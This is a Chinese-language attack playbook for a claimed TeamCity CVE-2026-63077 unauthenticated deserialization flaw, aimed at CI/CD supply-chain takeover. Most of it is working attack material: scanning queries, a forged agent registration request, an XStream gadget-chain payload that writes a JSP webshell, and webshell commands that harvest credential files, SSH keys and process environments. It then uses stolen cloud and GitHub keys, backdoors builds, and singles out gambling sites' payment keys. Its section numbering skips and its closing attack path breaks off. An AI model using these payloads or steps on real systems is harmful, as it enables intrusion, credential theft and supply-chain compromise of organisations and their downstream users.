# TeamCity CVE-2026-63077 杀伤链 Playbook

> **状态**：CISA KEV，已在野利用，APT 级别目标  
> **CVSS**：9.8 Critical  
> **影响**：JetBrains TeamCity On-Premises 全版本 < 2025.11.7 / < 2026.1.3  
> **价值**：CI/CD 供应链接管 — 源码 + 云密钥 + 下游部署环境一锅端  

---

## 一、为什么 TeamCity 是高价值目标

| 存储内容 | 价值 |
|----------|------|
| VCS token（GitHub/GitLab/Gitee） | 源码完整读写 |
| 云厂商 AK/SK（AWS/阿里云/腾讯云） | 云账号接管 |
| Docker Registry 凭据 | 镜像投毒 |
| SSH 私钥（部署到生产服务器） | 任意主机 shell |
| Kubernetes kubeconfig | 容器集群接管 |
| 数据库连接字符串 | 数据库直连 |
| 签名证书/密钥 | 代码签名伪造 |

## 二、漏洞根因（CVE-2026-63077）

```
TeamCity agent polling 端点 /app/agents/v1/* 无需认证
         ↓
XStream 反序列化 allowlist 未调用 NoTypePermission.NONE
         ↓
Throwable / Map 子类全部可反序列化
         ↓
Gadget Chain:
  HSQLMetadataStorage$SchemaMismatchException   (Throwable 子类)
    → org.apache.commons.dbcp2.BasicDataSource  (编译器生成字段跟随)
    → HSQLDB SCRIPT 命令                        (JDBC URL 执行任意 SQL)
    → 写入 JSP webshell 到 webroot
```

**修复方式**：在 XStreamHolder.setupSecurityIfNeeded() 中添加 `xStream.addPermission(NoTypePermission.NONE)` 清除默认权限。

## 三、完整利用链（5 步）

### Step 0：发现 TeamCity 实例

```bash
# 从目标域名自动发现
python3 炼蛊房/teamcity_probe.py scan -d 目标域名.com

# nuclei 批量扫描
nuclei -u https://目标 -t tools/1day-kit/custom-templates/teamcity-unauth-rce-cve-2026-63077.yaml

# Shodan/FOFA 搜索
# FOFA：  title="TeamCity" && country="CN"
# Shodan： http.title:"TeamCity" port:8111
# Censys： services.http.response.html_title: "TeamCity"
```

### Step 1：版本指纹确认

```bash
# 探测版本（受影响版本 < 2025.11.7 / < 2026.1.3）
python3 炼蛊房/teamcity_probe.py detect -u https://ci.目标.com

# 手工验证
curl -sk https://ci.目标.com/app/rest/server | python3 -m json.tool | grep version
```

**受影响版本判断**：
- `2025.11.x` 且 `x < 7` → 受影响
- `2026.1.x` 且 `x < 3` → 受影响  
- 早于 2025 的所有版本 → 受影响

### Step 2：注册伪 Agent Session

```bash
# 伪造 agent 注册（端点无需认证）
curl -sk -X POST https://ci.目标.com/app/agents/v1/register \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><agent-registration><name>probe-agent</name><host>127.0.0.1</host><port>9090</port><version>99.99</version><plugins/></agent-registration>'
```

成功返回示例：含 `agentId`、`token` 字段

### Step 3：发送反序列化 Gadget Chain（写 webshell）

```xml
<!-- gadget_chain.xml — XStream 反序列化 → HSQLDB 写文件 -->
<?xml version="1.0" encoding="UTF-8"?>
<com.jetbrains.buildServer.server.hsql.HSQLMetadataStorage_-SchemaMismatchException>
  <detailMessage>probe</detailMessage>
  <myHSQLStorage>
    <myDataSource class="org.apache.commons.dbcp2.BasicDataSource">
      <url>jdbc:hsqldb:script:/opt/teamcity/webapps/ROOT/tc_shell.jsp;shutdown=true</url>
    </myDataSource>
  </myHSQLStorage>
</com.jetbrains.buildServer.server.hsql.HSQLMetadataStorage_-SchemaMismatchException>
```

```bash
# 发送 gadget chain
curl -sk -X POST https://ci.目标.com/app/agents/v1/commands/error \
  -H "Content-Type: application/xml" \
  -H "Authorization: Bearer <agent_token>" \
  -d @gadget_chain.xml

# 验证 webshell
curl "https://ci.目标.com/tc_shell.jsp?cmd=id"
# 预期输出：uid=0(root) 或 teamcity 进程权限
```

> **注意**：webroot 路径因部署方式不同：
> - 默认安装：`/opt/teamcity/webapps/ROOT/`
> - Docker：`/opt/teamcity/webapps/ROOT/`
> - Windows：`C:\TeamCity\webapps\ROOT\`

### Step 4：凭据收割

```bash
# 方式 A：用 webshell 导出 TeamCity 数据库
curl "https://ci.目标.com/tc_shell.jsp?cmd=find%20/opt/teamcity/data%20-name%20*.properties%20-exec%20cat%20{}%20\;"

# 方式 B：用工具收割 REST API（如已拿到管理员 token）
python3 炼蛊房/teamcity_probe.py harvest \
  -u https://ci.目标.com \
  --token <admin_token>

# 方式 C：从 teamcity/data/config 目录提取
# /opt/teamcity/data/config/projects/<ProjectID>/buildTypes/*.xml  → 含 AK/SK/密码
# /opt/teamcity/data/config/projects/_Root/connections/  → VCS 凭据
# /opt/teamcity/data/config/database.properties          → 数据库连接

# 方式 D：直接读 HSQLDB 数据库（含加密密码）
curl "https://ci.目标.com/tc_shell.jsp?cmd=java%20-jar%20/opt/teamcity/lib/hsqldb-*.jar"
```

**重点收割目标**：
```
/opt/teamcity/data/config/database.properties       → 数据库密码
/opt/teamcity/data/config/projects/*/buildTypes/    → 构建步骤含环境变量
/opt/teamcity/data/system/keystore                  → 加密密钥库
~/.ssh/                                              → TeamCity 服务账户 SSH 密钥
/proc/$(pgrep java)/environ                          → 进程环境变量 AK/SK
```

### Step 5：供应链横向

```bash
# 1. 用收到的 GitHub token 访问源码
curl -H "Authorization: token <github_token>" https://api.github.com/user/repos

# 2. 用 AWS key 枚举资产
aws configure --profile teamcity
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances

# 3. 用阿里云 AK/SK
aliyun configure --profile teamcity
aliyun sts GetCallerIdentity

# 4. 污染构建（往源码注入后门）
# 修改触发构建的仓库，植入恶意代码，下次构建时自动编译进产物

# 5. 修改部署脚本（SSH 到生产服务器）
# TeamCity build step → SSH deploy → 直接执行任意命令到生产环境
```

## 六、典型成功路径

```
Censys/FOFA 发现暴露 TeamCity
    ↓
nuclei 确认版本受影响
    ↓
teamcity_probe.py exploit → gadget chain → webshell
    ↓
```

## 七、与博彩站目标关联

博彩站技术团队常见 CI/CD 架构：

```
开发推代码 → TeamCity 自动构建 → 部署到 CDN + 游戏服务器
                 ↑
         存着：支付通道密钥、数据库密码、
               前端加密 AES key、服务器 SSH key
```

找到 TeamCity 实例的方法：
1. 主域名子域枚举（`ci.`, `build.`, `devops.`, `teamcity.`）
2. 目标 GitHub org 下的 `.teamcity/` 目录（暴露 server URL）
3. 泄露的 APK/JS 中找 TeamCity REST API URL
